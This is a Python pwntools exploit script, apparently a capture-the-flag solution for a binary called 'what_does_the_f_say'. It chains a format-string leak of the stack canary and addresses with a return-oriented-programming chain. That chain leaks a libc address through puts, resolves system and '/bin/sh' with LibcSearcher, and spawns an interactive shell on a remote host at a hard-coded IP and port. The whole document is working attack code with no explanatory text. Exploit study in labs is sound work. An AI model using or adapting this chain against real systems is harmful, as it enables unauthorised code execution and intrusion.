from pwn import *
from termcolor import colored
from LibcSearcher import *

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
context.log_level = 'DEBUG'
DEBUG = 0
file = './what_does_the_f_say'
exe  = ELF(file)


def buy_drinks(choice, fmt_payload=None):
    io.sendlineafter(b"food\n", b"1")
    io.sendlineafter(b"3. Deathstar(70.00 s.rocks)\n", choice)
    if choice == b"2":
        io.sendlineafter(b"Red or Green Kryptonite?\n", fmt_payload)

    

def main(io, libc=None):
    # declared
    # exploit
    buy_drinks(b"2", b"%13$p %15$p %14$p")
    recv = io.recvuntil(b"\n")
    leak_addrs = recv[:-1].split(b" ")
    canary = int(leak_addrs[0], 16)
    leak_binary = int(leak_addrs[1], 16)
    binary_base = leak_binary - exe.symbols["fox_bar"] - 106
    # 0x7ffcfbccbea0
    leaked_stack = int(leak_addrs[2], 16)

    info("Canary:           %#x"    %   canary)
    info("Binary base:      %#x"    %   binary_base)
    info("Leaked stack:     %#x"    %   leaked_stack)

    exe.address = binary_base

    info("puts GOT:     %#x"    %   exe.got["puts"])
    info("read GOT:     %#x"    %   exe.got["read"])

    for i in range(7):
        buy_drinks(b"2", b"Red")
    
    ret_printf_addr = exe.address + 0x1640
    pop_rdi_ret = exe.address + 0x18bb
    pop_rsi_ret = exe.address + 0x18b9

    # payload = b"A"*24 + p64(canary) + p64(exe.got["read"] + 0x30) + p64(ret_printf_addr)
    payload =  b"A"*24 
    payload += p64(canary)
    payload += p64(leaked_stack - 0x20) 
    payload += p64(pop_rdi_ret)
    payload += p64(exe.got["puts"])
    payload += p64(exe.address + 0x1481)
    
    buy_drinks(b"2", b"Red")
    io.sendlineafter(b"you want to buy it?\n", payload)
    recv = io.recv()
    print("recv:    ", recv)
    libc_leaked = u64(recv[:6].ljust(8, b"\x00"))
    info("Leaked puts() libc address:      %#x"    %   libc_leaked)
    
    # puts: a30
    # memset: 1c0
    # read 180
    # https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so
    # https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so
    system_address = 0
    str_bin_sh = 0

    if DEBUG:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc.address = libc_leaked - libc.sym["puts"]
        system_address = libc.sym["system"]
        str_bin_sh = next(libc.search(b"/bin/sh"))

        info("libc base:        %#x"    %       libc.address)
        info("libc system:      %#x"    %       system_address)
        info("libc str_bin_sh:  %#x"    %       str_bin_sh)      
    else:
        libc = LibcSearcher("puts", 0xa30)
        # libc.add_condition("exit", 0x1d0)
        libc.add_condition("read", 0x180)
        libc_base = libc_leaked - libc.dump("puts")
        system_address = libc_base + libc.dump("system")
        str_bin_sh = libc_base + libc.dump("str_bin_sh")

        info("libc base:        %#x"    %       libc_base)
        info("libc system:      %#x"    %       system_address)
        info("libc str_bin_sh:  %#x"    %       str_bin_sh)
    
    payload =  b"B"*24
    payload += p64(canary)
    payload += p64(leaked_stack) 
    payload += p64(pop_rdi_ret)
    payload += p64(str_bin_sh)
    payload += p64(pop_rsi_ret)
    payload += p64(leaked_stack)
    payload += p64(0x0)
    payload += p64(system_address)
    
    io.sendline(payload)



if __name__ == '__main__':
    if DEBUG:
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        # libc = ELF('./libc_32.so.6')
        io = remote('167.99.206.220', 30684)
    
    main(io)
    io.interactive()